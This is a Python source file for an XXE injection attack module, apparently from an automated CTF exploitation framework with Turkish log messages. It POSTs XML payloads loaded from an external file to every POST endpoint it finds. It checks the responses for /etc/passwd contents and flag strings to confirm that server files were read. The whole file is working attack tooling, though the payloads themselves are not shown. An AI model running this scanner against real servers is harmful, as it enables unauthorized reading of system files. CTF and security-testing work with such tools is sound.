"""
XXE (XML External Entity) injection attack module.
Sends XML payloads as raw POST body — no param injection.
Detection: file read signatures in response body only (no OOB).
"""
from __future__ import annotations
from pathlib import Path

from attacks.base import BaseAttack, SessionExpiredError
from engine.flag_hunter import extract_interesting_data, has_definite_flag
from rich.console import Console

console = Console(legacy_windows=False)

XXE_PARAM_HINTS = [
    "xml", "data", "body", "input", "content", "upload",
    "import", "soap", "payload", "request", "message", "doc",
]

XXE_PATH_HINTS = ["xml", "soap", "wsdl"]

FILE_READ_SIGNATURES = [
    "root:x:", "bin:x:", "www-data:", "daemon:", "nobody:", "ntp:",
    "flag{", "FLAG{", "ctf{", "CTF{", "HTB{", "picoCTF{", "DUCTF{",
    "/bin/sh", "/bin/bash", "/bin/false",
]

_PAYLOAD_FILE = Path(__file__).parent.parent / "payloads" / "xxe.txt"

_XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
]


class XXEAttack(BaseAttack):
    name = "xxe"
    _seen_urls: set[str] = set()  # class-level — shared across all instances per process

    def _load_payloads(self) -> list[str]:
        if not _PAYLOAD_FILE.exists():
            return []
        return [
            line.strip()
            for line in _PAYLOAD_FILE.read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.startswith("#")
        ]

    def _is_relevant(self, attack_point: dict) -> bool:
        url = attack_point.get("url", "")
        param = attack_point.get("param", "") or ""
        method = (attack_point.get("method", "GET") or "GET").upper()

        if any(h in url.lower() for h in XXE_PATH_HINTS):
            return True
        if param and any(h in param.lower() for h in XXE_PARAM_HINTS):
            return True
        # Try all POST endpoints as fallback — many CTF XML endpoints have no hints
        if method == "POST":
            return True
        return False

    def _has_file_read(self, body: str) -> str | None:
        for sig in FILE_READ_SIGNATURES:
            if sig in body:
                return sig
        return None

    async def run(self, attack_point: dict, _payloads: list[str]) -> list[dict]:
        if not self._is_relevant(attack_point):
            return []

        url = attack_point["url"]
        if url in XXEAttack._seen_urls:
            return []
        XXEAttack._seen_urls.add(url)

        method = (attack_point.get("method", "POST") or "POST").upper()
        if method == "GET":
            method = "POST"

        xml_payloads = self._load_payloads()
        if not xml_payloads:
            return []

        console.print(f"  [cyan][XXE][/cyan] {method} {url}")
        all_findings: list[dict] = []

        for payload in xml_payloads:
            if self._should_stop():
                return all_findings
            for ct in _XML_CONTENT_TYPES:
                if self._should_stop():
                    return all_findings
                try:
                    resp = await self.session.post(
                        url,
                        content=payload.encode("utf-8"),
                        headers={"Content-Type": ct},
                        timeout=10.0,
                    )
                except SessionExpiredError:
                    raise
                except Exception:
                    continue

                if resp is None:
                    continue

                body = resp.text
                sig = self._has_file_read(body)
                if sig:
                    _preview = body[:400].strip().replace("\n", "\\n")
                    console.print(
                        f"  [bold red][XXE][/bold red] Dosya okuma! "
                        f"({ct}) imza={sig!r} @ {url}\n"
                        f"  [dim]  {_preview}[/dim]"
                    )
                    all_findings.append({
                        "type": "xxe_file_read",
                        "value": (
                            f"XXE file read (imza={sig!r}) @ {url} "
                            f"payload={payload[:60]!r}"
                        ),
                        "confidence": 0.9,
                    })
                    findings = extract_interesting_data(body)
                    flag = has_definite_flag(findings)
                    if flag:
                        console.print(f"  [bold green][XXE][/bold green] FLAG: {flag}")
                        all_findings.extend(
                            [f for f in findings if f.get("confidence", 0) >= 1.0]
                        )
                        self.stop_event.set()
                        return all_findings
                    # One hit per URL is enough
                    return all_findings

        return all_findings
